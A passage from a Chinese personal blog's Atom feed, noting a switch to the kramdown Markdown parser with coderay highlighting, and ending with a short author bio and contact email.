  &lt;h2 id=&quot;调整&quot;&gt;调整&lt;/h2&gt;
  &lt;p&gt;Markdown解析器改用&lt;code&gt;kramdown&lt;/code&gt;, 语法高亮coderay, 自动生成toc. &lt;a href=&quot;https://help.github.com/categories/writing-on-github/&quot;&gt;GFM(GitHub Flavored Markdown)&lt;/a&gt;.&lt;/p&gt;

  &lt;div class=&quot;language-ruby highlighter-coderay&quot;&gt;&lt;div class=&quot;CodeRay&quot;&gt;
  &lt;div class=&quot;code&quot;&gt;&lt;pre&gt;gem install kramdown
gem install coderay
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;关于我&quot;&gt;关于我&lt;/h1&gt;
&lt;blockquote&gt;
  &lt;p&gt;一个不断追求进步的北漂程序猿&lt;/p&gt;

  &lt;h2 id=&quot;联系方式&quot;&gt;联系方式&lt;/h2&gt;
  &lt;p&gt;Email: yanpeipan@waywings.com&lt;/p&gt;
&lt;/blockquote&gt;
</content>
 </entry>
 

</feed>
